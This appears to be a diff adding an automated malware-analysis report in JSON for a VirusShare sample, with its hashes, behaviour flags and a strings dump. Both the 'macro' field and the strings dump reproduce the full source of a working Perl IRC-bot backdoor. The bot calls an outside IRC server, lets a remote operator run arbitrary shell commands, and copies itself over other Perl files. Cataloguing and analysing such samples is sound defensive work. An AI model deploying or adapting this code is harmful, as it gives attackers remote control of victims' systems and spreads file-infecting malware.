@@ -1,0 +1,48 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "chr": "May attempt to obfuscate specific str",
+            "open": "May open a file"
+        },
+        "macro": "use IO::Socket;$p=';';$k=chr(126);$c=chr(35).chr(49).chr(51).chr(49);#NAD + DAV\n$s=chr(105).'rc.quakenet.org';@n=('1','2','3','4','5','6','7','8','9');#4 EVER!\n$d=IO::Socket::INET->new(PeerAddr=>$s,PeerPort=>6667,Proto=>'tcp')or die;#<3+<3\nwhile($l=<$d>){if($l=~/(NOTICE AUTH).*(checking ident)/i){$w=$n[int rand($#n)];\n$x=$n[int rand($#n)]; $y=$n[int rand($#n)];$z=$n[int rand($#n)];print$d\"NICK \".\nchr(110).chr(97).chr(100).\"$w$x$y$z\\nUSER p 0 0 :p\\n\"; }if($l=~\"End of /MOTD\"){\nprint$d\"JOIN $c $k\\r\\n\";sleep 1;$u=`uname -a`;print$d\"PRIVMSG $c :$^O $0 $u\\n\";\nprint$d\"PRIVMSG $c :\".chr(60).chr(51).\" nadine i love u \".chr(60).chr(51).\"\\n\"; \n}if($l=~\"!viri\"){viri()}if($l=~\"!raw\"){@m=split(/$p/,$l);print$d\"$m[1]\\n\"; }if(\n$l=~\"!c\"){@m=split(/$p/,$l);@a=`$m[1]`;foreach$a(@a){print$d\"PRIVMSG $c :$a\\n\";\n}}if($l=~/^PING/){print$d\"PONG :\".(split(/ :/,$l))[1];}}while($l=<$d>){($b,$t)=\nsplit(/ :/,$l);if($b eq 'PING'){while((index($t,\"\\r\")>=0)||(index($t,\"\\n\")>= 0)\n){chop($t);}print$d\"PONG $t\\n\";next;}}sub viri(){open(FH,$0);@Q=<FH>;close(FH);\nforeach$f(<*.pl>){if($f ne $0){open(FH,\">$f\");print FH @Q;close(FH);}}}#<3<3<3!\t"
+    },
+    "filename": "VirusShare_9e52576308331f87411c18690689f96d",
+    "filesize": 1134,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "9e52576308331f87411c18690689f96d",
+        "sha1": "3f62a6a3d4ba270b401dfad1326703e08197d12f",
+        "sha256": "579e441b2ea315320997398f8fc812b02475f6d2a370b1112772eb0daa6629c7"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "use IO::Socket;$p=';';$k=chr(126);$c=chr(35).chr(49).chr(51).chr(49);#NAD + DAV",
+            "$s=chr(105).'rc.quakenet.org';@n=('1','2','3','4','5','6','7','8','9');#4 EVER!",
+            "$d=IO::Socket::INET->new(PeerAddr=>$s,PeerPort=>6667,Proto=>'tcp')or die;#<3+<3",
+            "while($l=<$d>){if($l=~/(NOTICE AUTH).*(checking ident)/i){$w=$n[int rand($#n)];",
+            "$x=$n[int rand($#n)]; $y=$n[int rand($#n)];$z=$n[int rand($#n)];print$d\"NICK \".",
+            "chr(110).chr(97).chr(100).\"$w$x$y$z\\nUSER p 0 0 :p\\n\"; }if($l=~\"End of /MOTD\"){",
+            "print$d\"JOIN $c $k\\r\\n\";sleep 1;$u=`uname -a`;print$d\"PRIVMSG $c :$^O $0 $u\\n\";",
+            "print$d\"PRIVMSG $c :\".chr(60).chr(51).\" nadine i love u \".chr(60).chr(51).\"\\n\"; ",
+            "}if($l=~\"!viri\"){viri()}if($l=~\"!raw\"){@m=split(/$p/,$l);print$d\"$m[1]\\n\"; }if(",
+            "$l=~\"!c\"){@m=split(/$p/,$l);@a=`$m[1]`;foreach$a(@a){print$d\"PRIVMSG $c :$a\\n\";",
+            "}}if($l=~/^PING/){print$d\"PONG :\".(split(/ :/,$l))[1];}}while($l=<$d>){($b,$t)=",
+            "split(/ :/,$l);if($b eq 'PING'){while((index($t,\"\\r\")>=0)||(index($t,\"\\n\")>= 0)",
+            "){chop($t);}print$d\"PONG $t\\n\";next;}}sub viri(){open(FH,$0);@Q=<FH>;close(FH);",
+            "foreach$f(<*.pl>){if($f ne $0){open(FH,\">$f\");print FH @Q;close(FH);}}}#<3<3<3!\t"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.268187",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
